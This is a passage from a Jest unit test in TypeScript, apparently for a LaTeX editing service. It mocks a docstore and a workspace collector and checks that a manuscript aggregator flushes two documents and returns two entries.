          { id: 'n2', type: 'DOC', docId: docId2, path: '/sec.tex', name: 'sec.tex' },
          { id: 'n3', type: 'FOLDER', docId: null, path: '/figs', name: 'figs' },
        ]),
      };
      const mockDocstore: any = {
        getDoc: jest.fn(async (_projId: string, dId: string) => ({
          _id: dId,
          lines: dId === docId1 ? ['\\documentclass{article}'] : ['\\section{Intro}'],
        })),
      };
      const mockFilestore: any = {};
      const mockCollector: any = {
        flushProjectWorkspace: jest.fn(async () => [docId1, docId2]),
      };

      const aggregator = new ManuscriptAggregatorAdapter(
        mockStructure,
        mockDocstore,
        mockFilestore,
        undefined,
        undefined,
        undefined,
        mockCollector,
      );

      const entries = await aggregator.collectProjectEntries(projectId, false, false);
      expect(mockCollector.flushProjectWorkspace).toHaveBeenCalledWith(
        projectId,
        [docId1, docId2],
      );
      expect(entries).toHaveLength(2);
    });
  });
});
